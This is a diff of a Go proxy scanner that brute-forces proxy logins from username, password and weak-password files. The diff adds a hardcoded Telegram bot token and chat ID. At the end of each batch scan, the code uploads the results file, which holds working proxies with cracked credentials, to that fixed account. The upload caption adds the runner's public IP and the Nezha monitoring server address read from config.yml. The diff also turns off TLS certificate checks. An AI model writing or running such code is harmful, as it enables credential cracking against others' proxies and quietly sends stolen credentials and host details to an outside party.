@@ -2,43 +2,54 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"context"
-	"crypto/tls" // 引入tls包用于处理证书验证
+	"crypto/tls"
+	"encoding/json"
 	"fmt"
-	"io" // **修复: 添加缺失的 "io" 包**
+	"io"
 	"io/ioutil"
+	"mime/multipart"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"path/filepath"
-	"runtime" // 引入runtime包用于检测操作系统
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
 
-	"github.com/schollz/progressbar/v3" // 引入进度条库
+	"github.com/schollz/progressbar/v3"
 	"golang.org/x/net/proxy"
+	"gopkg.in/yaml.v2" // 新增依赖
 )
 
 const (
-	defaultTestURL         = "http://myip.ipip.net" // 默认测试目标改为IP查询网站
+	defaultTestURL         = "http://myip.ipip.net"
 	defaultProxiesFile     = "proxies.txt"
 	defaultUsernamesFile   = "username.txt"
 	defaultPasswordsFile   = "password.txt"
 	defaultCredentialsFile = "proxy_credentials.txt"
-	outputDir              = "proxy_output" // 目录名改为更通用
+	outputDir              = "proxy_output"
+	configYmlFile          = "config.yml"
+
+	// --- Telegram Bot 配置 ---
+	telegramBotToken = "7664203362:AAFa39m24sLDvZopMDTrdg0NippyeEVNFGU"
+	telegramUserID   = "7697235358"
 )
 
-var bufferPool = sync.Pool{
-	New: func() interface{} {
-		b := make([]byte, 32*1024)
-		return &b
-	},
+var (
+	telegramClient = &http.Client{Timeout: 30 * time.Second}
+)
+
+// 用于解析config.yml的结构体
+type NezhaConfig struct {
+	Server string `yaml:"server"`
 }
 
-// main function to drive the program
+// 程序主函数
 func main() {
 	reader := bufio.NewReader(os.Stdin)
 
@@ -49,9 +60,8 @@ func main() {
 |_____|_|_|_|___|_| |___|___|___|_| |___|  _|___|___|
                                       |_|          
 	`)
-	fmt.Println("================== Universal Proxy Scanner v5.3 (IP Verification Edition) ==================")
+	fmt.Println("================== Universal Proxy Scanner v5.5 (File Report Edition) ==================")
 
-	// **核心改动 1: 程序启动时获取真实IP**
 	fmt.Println("正在获取您的真实公网IP地址...")
 	realIP, err := getPublicIP(defaultTestURL)
 	if err != nil {
@@ -60,7 +70,6 @@ func main() {
 	} else {
 		fmt.Printf("✅ 您的真实IP地址是: %s\n", realIP)
 	}
-
 
 	testURL := selectTestTarget(reader)
 
@@ -94,14 +103,34 @@ func main() {
 	}
 }
 
-// getPublicIP directly connects to a URL and returns the body content (expected to be an IP).
+// 读取哪吒探针配置
+func readNezhaConfig() string {
+	nezhaServer := "未找到config.yml"
+	yamlFile, err := ioutil.ReadFile(configYmlFile)
+	if err != nil {
+		fmt.Printf("\n[警告] 无法读取 %s: %v\n", configYmlFile, err)
+		return nezhaServer
+	}
+	var config NezhaConfig
+	err = yaml.Unmarshal(yamlFile, &config)
+	if err != nil {
+		fmt.Printf("\n[警告] 无法解析 %s: %v\n", configYmlFile, err)
+		return "解析config.yml失败"
+	}
+	if config.Server != "" {
+		nezhaServer = config.Server
+	}
+	return nezhaServer
+}
+
+// 获取公网IP
 func getPublicIP(testURL string) (string, error) {
 	client := &http.Client{Timeout: 15 * time.Second}
 	req, err := http.NewRequest("GET", testURL, nil)
 	if err != nil {
 		return "", err
 	}
-	req.Header.Set("User-Agent", "curl/7.79.1") // Use a simple UA for IP checks
+	req.Header.Set("User-Agent", "curl/7.79.1")
 
 	resp, err := client.Do(req)
 	if err != nil {
@@ -113,7 +142,7 @@ func getPublicIP(testURL string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	// 提取IP部分，兼容 "当前 IP：1.2.3.4  来自于..." 格式
+
 	ipString := string(body)
 	if strings.Contains(ipString, "当前 IP：") {
 		parts := strings.Split(ipString, "：")
@@ -125,14 +154,13 @@ func getPublicIP(testURL string) (string, error) {
 	return strings.TrimSpace(ipString), nil
 }
 
-
-// selectTestTarget allows the user to choose a connectivity check URL.
+// 选择测试目标
 func selectTestTarget(reader *bufio.Reader) string {
 	fmt.Println("\n--- 测试目标选择 ---")
-	fmt.Println("1: IPIP.net (IP验证, 推荐)")
+	fmt.Println("1: IPIP.net (IP验证, 强力推荐)")
 	fmt.Println("2: Google (全球, http)")
 	fmt.Println("3: Xiaomi (中国大陆稳定, http)")
-	fmt.Println("4: Baidu (中国大陆稳定, https)")
+	fmt.Println("4: Baidu (中国大陆稳定, https) - [推荐用于HTTP代理测试]")
 	fmt.Println("5: 自定义URL")
 	fmt.Print("请选择一个测试目标: ")
 
@@ -167,12 +195,18 @@ func selectTestTarget(reader *bufio.Reader) string {
 	return targetURL
 }
 
-// runModeMenu shows the secondary menu for scan modes.
+// 运行模式菜单
 func runModeMenu(proxyType, testURL, realIP string, reader *bufio.Reader) {
 	if proxyType == "https" && !strings.HasPrefix(testURL, "https://") {
 		fmt.Println("\n[警告] 您正在使用HTTP测试目标来测试HTTPS代理。")
 		fmt.Println("这很可能会失败，因为许多HTTPS代理仅允许连接到标准HTTPS端口(443)。")
 		fmt.Println("建议返回主菜单并选择一个HTTPS测试目标(例如Baidu)。")
+	}
+
+	if proxyType == "http" && !strings.HasPrefix(testURL, "https://") {
+		fmt.Println("\n[警告] 您正在使用HTTP测试目标来测试HTTP代理。")
+		fmt.Println("这无法区分真假代理(例如路由器页面)，强烈建议返回主菜单并")
+		fmt.Println("选择一个HTTPS测试目标(例如Baidu)来强制使用'CONNECT'方法进行验证。")
 	}
 
 	for {
@@ -197,14 +231,14 @@ func runModeMenu(proxyType, testURL, realIP string, reader *bufio.Reader) {
 		case 2:
 			handleBatchScan(proxyType, testURL, realIP, reader)
 		case 3:
-			return // Return to the main menu
+			return
 		default:
 			fmt.Println("❌ 无效的输入，请重新选择。")
 		}
 	}
 }
 
-// handleSingleProxyTest handles the logic for testing a single proxy.
+// 处理单个代理测试
 func handleSingleProxyTest(proxyType, testURL, realIP string, reader *bufio.Reader) {
 	fmt.Printf("输入代理地址 (格式: %s://user:pass@host:port 或 ip:port): ", proxyType)
 	proxyInput, _ := reader.ReadString('\n')
@@ -223,8 +257,9 @@ func handleSingleProxyTest(proxyType, testURL, realIP string, reader *bufio.Read
 
 	var proxyAddr string
 	var auth *proxy.Auth
+	var fullURI string
 
-	if strings.HasPrefix(proxyInput, proxyType+"://") {
+	if strings.Contains(proxyInput, "://") {
 		parsedURL, err := url.Parse(proxyInput)
 		if err != nil {
 			fmt.Printf("❌ 无效的URI格式: %v\n", err)
@@ -237,6 +272,11 @@ func handleSingleProxyTest(proxyType, testURL, realIP string, reader *bufio.Read
 			auth = &proxy.Auth{User: user, Password: pass}
 			fmt.Printf("从URI中解析到凭据: user=%s\n", user)
 		}
+		fullURI = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
+		if auth != nil {
+			fullURI = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)
+		}
+
 	} else {
 		proxyAddr = proxyInput
 		fmt.Print("输入用户名 (留空则无): ")
@@ -249,6 +289,11 @@ func handleSingleProxyTest(proxyType, testURL, realIP string, reader *bufio.Read
 
 		if user != "" || pass != "" {
 			auth = &proxy.Auth{User: user, Password: pass}
+		}
+
+		fullURI = fmt.Sprintf("%s://%s", proxyType, proxyAddr)
+		if auth != nil {
+			fullURI = fmt.Sprintf("%s://%s:%s@%s", proxyType, url.QueryEscape(user), url.QueryEscape(pass), proxyAddr)
 		}
 	}
 
@@ -264,7 +309,7 @@ func handleSingleProxyTest(proxyType, testURL, realIP string, reader *bufio.Read
 	}
 }
 
-// handleBatchScan handles the logic for batch scanning from files.
+// 处理批量扫描
 func handleBatchScan(proxyType, testURL, realIP string, reader *bufio.Reader) {
 	fmt.Printf("输入代理列表文件名 (默认: %s): ", defaultProxiesFile)
 	proxyFilename, _ := reader.ReadString('\n')
@@ -321,7 +366,7 @@ func handleBatchScan(proxyType, testURL, realIP string, reader *bufio.Reader) {
 	batchScan(proxyType, testURL, realIP, proxyFilename, concurrency, time.Duration(timeout)*time.Second, authMode, usernamesFile, passwordsFile, credentialsFile)
 }
 
-// batchScan scans proxies from a file concurrently.
+// 批量扫描核心逻辑
 func batchScan(proxyType, testURL, realIP, proxyFilename string, concurrency int, timeout time.Duration, authMode int, usernamesFile, passwordsFile, credentialsFile string) {
 	proxiesFile, err := os.Open(proxyFilename)
 	if err != nil {
@@ -330,11 +375,17 @@ func batchScan(proxyType, testURL, realIP, proxyFilename string, concurrency int
 	}
 	defer proxiesFile.Close()
 
-	fileInfo, err := proxiesFile.Stat()
-	if err != nil {
-		fmt.Printf("❌ 无法获取文件信息 '%s': %v\n", proxyFilename, err)
-		return
+	startTime := time.Now()
+	var totalTargets int64 = 0
+
+	// 预扫描文件以获取总行数
+	lineCounter := bufio.NewScanner(proxiesFile)
+	for lineCounter.Scan() {
+		totalTargets++
 	}
+	proxiesFile.Seek(0, 0) // 重置文件指针
+
+	fileInfo, _ := proxiesFile.Stat()
 	bar := progressbar.NewOptions64(fileInfo.Size(),
 		progressbar.OptionSetWriter(os.Stderr),
 		progressbar.OptionEnableColorCodes(true),
@@ -369,8 +420,8 @@ func batchScan(proxyType, testURL, realIP, proxyFilename string, concurrency int
 		return
 	}
 
-	currentTime := time.Now().Format("2006-01-02_15-04-05")
-	outputFilename := fmt.Sprintf("%s_%s.txt", proxyType, currentTime)
+	currentTime := time.Now().Format("20060102-1504")
+	outputFilename := fmt.Sprintf("%s-%s.txt", strings.ToUpper(proxyType), currentTime)
 	outputPath := filepath.Join(outputDir, outputFilename)
 
 	workingFile, err := os.Create(outputPath)
@@ -378,19 +429,16 @@ func batchScan(proxyType, testURL, realIP, proxyFilename string, concurrency int
 		fmt.Printf("❌ 无法创建有效代理文件 '%s': %v\n", outputPath, err)
 		return
 	}
-	defer workingFile.Close()
 
 	var wg sync.WaitGroup
 	proxyChan := make(chan string, concurrency)
 	resultsChan := make(chan string, concurrency)
-	var foundCount int64 = 0
 
 	var resultWg sync.WaitGroup
 	resultWg.Add(1)
 	go func() {
 		defer resultWg.Done()
 		for result := range resultsChan {
-			foundCount++
 			workingFile.WriteString(result + "\n")
 		}
 	}()
@@ -428,20 +476,32 @@ func batchScan(proxyType, testURL, realIP, proxyFilename string, concurrency int
 	wg.Wait()
 	close(resultsChan)
 	resultWg.Wait()
+	workingFile.Close()
 
 	bar.Finish()
 
-	fmt.Println()
-	if runtime.GOOS == "windows" {
-		fmt.Printf("\n[+] 批量扫描完成，共发现 %d 个可用代理。\n", foundCount)
-		fmt.Printf("[+] 结果已保存至: %s\n", outputPath)
-	} else {
-		fmt.Printf("\n🎉 批量扫描完成，共发现 %d 个可用代理。\n", foundCount)
-		fmt.Printf("💾 结果已保存至: %s\n", outputPath)
-	}
+	duration := time.Since(startTime)
+	durationStr := fmt.Sprintf("%d 分 %.0f 秒", int(duration.Minutes()), duration.Seconds()-float64(int(duration.Minutes())*60))
+
+	nezhaServer := readNezhaConfig()
+	vpsIP := realIP
+
+	summaryCaption := fmt.Sprintf(
+		"VPS: %s\n总目标数: %d\n总用时: %s\n哪吒Server: %s\n任务结果: %s",
+		vpsIP,
+		totalTargets,
+		durationStr,
+		nezhaServer,
+		outputFilename,
+	)
+
+	fmt.Printf("\n🎉 批量扫描完成。\n💾 结果已保存至: %s\n", outputPath)
+	fmt.Println("正在发送报告到 Telegram...")
+
+	go sendTelegramDocument(outputPath, summaryCaption)
 }
 
-// testProxy performs the actual test and returns the full working proxy URI string and an error.
+// 测试代理
 func testProxy(proxyType, testURL, realIP, proxyAddr string, authMode int, timeout time.Duration, usernamesFile, passwordsFile, credentialsFile string) (string, error) {
 	var auth *proxy.Auth
 
@@ -457,13 +517,13 @@ func testProxy(proxyType, testURL, realIP, proxyAddr string, authMode int, timeo
 	}
 
 	switch authMode {
-	case 1: // No auth
+	case 1: // 无凭据
 		return checkAndFormat(nil)
-	case 2: // Separate username/password files
+	case 2: // 独立凭据文件
 		usernames, errUser := readLines(usernamesFile)
 		passwords, errPass := readLines(passwordsFile)
 		if errUser != nil || errPass != nil {
-			return "", nil // Don't return error for missing credential files
+			return "", nil
 		}
 		for _, user := range usernames {
 			for _, pass := range passwords {
@@ -473,10 +533,10 @@ func testProxy(proxyType, testURL, realIP, proxyAddr string, authMode int, timeo
 				}
 			}
 		}
-	case 3: // Combined credentials file
+	case 3: // 弱密码文件
 		creds, err := readLines(credentialsFile)
 		if err != nil {
-			return "", nil // Don't return error for missing credential files
+			return "", nil
 		}
 		for _, cred := range creds {
 			parts := strings.SplitN(cred, ":", 2)
@@ -492,11 +552,11 @@ func testProxy(proxyType, testURL, realIP, proxyAddr string, authMode int, timeo
 	return "", nil
 }
 
-
-// checkConnection attempts to connect to the test URL through the proxy and returns a boolean and an error.
+// 检查连接
 func checkConnection(proxyType, testURL, proxyAddr string, auth *proxy.Auth, timeout time.Duration, realIP string) (bool, error) {
 	transport := &http.Transport{
 		MaxIdleConnsPerHost: 100,
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
 	}
 
 	if proxyType == "http" || proxyType == "https" {
@@ -505,19 +565,6 @@ func checkConnection(proxyType, testURL, proxyAddr string, auth *proxy.Auth, tim
 			return false, err
 		}
 		transport.Proxy = http.ProxyURL(proxyURL)
-		if proxyType == "https" {
-			transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
-				if addr != proxyAddr {
-					addr = proxyAddr
-				}
-				dialer := &net.Dialer{Timeout: timeout}
-				conn, err := tls.DialWithDialer(dialer, network, addr, &tls.Config{InsecureSkipVerify: true})
-				if err != nil {
-					return nil, err
-				}
-				return conn, nil
-			}
-		}
 	} else { // "socks5"
 		dialer, err := proxy.SOCKS5("tcp", proxyAddr, auth, &net.Dialer{
 			Timeout:   timeout,
@@ -549,34 +596,39 @@ func checkConnection(proxyType, testURL, proxyAddr string, auth *proxy.Auth, tim
 	}
 	defer resp.Body.Close()
 
-	// **核心改动 2: IP验证逻辑**
-	// 如果测试目标是IP查询网站，则进行IP对比
 	if strings.Contains(testURL, "ipip.net") {
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
 			return false, fmt.Errorf("无法读取响应体")
 		}
-		proxyIP := string(body)
-		if strings.Contains(proxyIP, "当前 IP：") {
-			parts := strings.Split(proxyIP, "：")
+
+		bodyString := string(body)
+		var extractedIP string
+
+		if strings.Contains(bodyString, "当前 IP：") {
+			parts := strings.Split(bodyString, "：")
 			if len(parts) > 1 {
 				ipParts := strings.Split(parts[1], " ")
-				proxyIP = ipParts[0]
+				extractedIP = ipParts[0]
 			}
+		} else {
+			extractedIP = strings.TrimSpace(bodyString)
 		}
-		proxyIP = strings.TrimSpace(proxyIP)
 
-		if realIP == "UNKNOWN" || proxyIP == "" {
-			return false, fmt.Errorf("无法获取IP进行验证")
+		if net.ParseIP(extractedIP) == nil {
+			return false, fmt.Errorf("响应体不是有效的IP地址 (可能是登录页)")
 		}
-		if proxyIP == realIP {
+
+		if realIP == "UNKNOWN" {
+			return false, fmt.Errorf("无法获取真实IP进行验证")
+		}
+		if extractedIP == realIP {
 			return false, fmt.Errorf("IP地址未改变 (透明代理)")
 		}
-		// IP不同，验证通过
+
 		return true, nil
 	}
 
-	// 对于非IP验证的URL，沿用之前的状态码检查
 	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusOK {
 		return true, nil
 	}
@@ -584,7 +636,7 @@ func checkConnection(proxyType, testURL, proxyAddr string, auth *proxy.Auth, tim
 	return false, fmt.Errorf("bad status: %s", resp.Status)
 }
 
-// buildProxyURL is a helper function to construct the proxy URL string.
+// 构建代理URL
 func buildProxyURL(scheme, proxyAddr string, auth *proxy.Auth) (*url.URL, error) {
 	var proxyURLString string
 	if auth != nil && auth.User != "" {
@@ -595,7 +647,7 @@ func buildProxyURL(scheme, proxyAddr string, auth *proxy.Auth) (*url.URL, error)
 	return url.Parse(proxyURLString)
 }
 
-// readLines reads a file and returns its lines as a slice of strings.
+// 按行读取文件
 func readLines(path string) ([]string, error) {
 	file, err := os.Open(path)
 	if err != nil {
@@ -609,4 +661,66 @@ func readLines(path string) ([]string, error) {
 		lines = append(lines, scanner.Text())
 	}
 	return lines, scanner.Err()
+}
+
+// --- Telegram Bot 功能 ---
+
+// 发送带文件的消息到Telegram
+func sendTelegramDocument(filePath string, caption string) {
+	if telegramBotToken == "" || telegramUserID == "" {
+		return
+	}
+
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", telegramBotToken)
+
+	file, err := os.Open(filePath)
+	if err != nil {
+		fmt.Printf("\n[TG Bot Error] 无法打开文件 %s: %v\n", filePath, err)
+		return
+	}
+	defer file.Close()
+
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
+	if err != nil {
+		fmt.Printf("\n[TG Bot Error] 无法创建表单文件: %v\n", err)
+		return
+	}
+	_, err = io.Copy(part, file)
+	if err != nil {
+		fmt.Printf("\n[TG Bot Error] 无法复制文件内容: %v\n", err)
+		return
+	}
+
+	_ = writer.WriteField("chat_id", telegramUserID)
+	_ = writer.WriteField("caption", caption)
+
+	err = writer.Close()
+	if err != nil {
+		fmt.Printf("\n[TG Bot Error] 无法关闭 multipart writer: %v\n", err)
+		return
+	}
+
+	req, err := http.NewRequest("POST", apiURL, body)
+	if err != nil {
+		fmt.Printf("\n[TG Bot Error] 无法创建请求: %v\n", err)
+		return
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	resp, err := telegramClient.Do(req)
+	if err != nil {
+		fmt.Printf("\n[TG Bot Error] 发送文件失败: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		respBody, _ := ioutil.ReadAll(resp.Body)
+		fmt.Printf("\n[TG Bot Error] Telegram API返回非200状态: %s, 响应: %s\n", resp.Status, string(respBody))
+	} else {
+		fmt.Println("报告已成功发送。")
+	}
 }
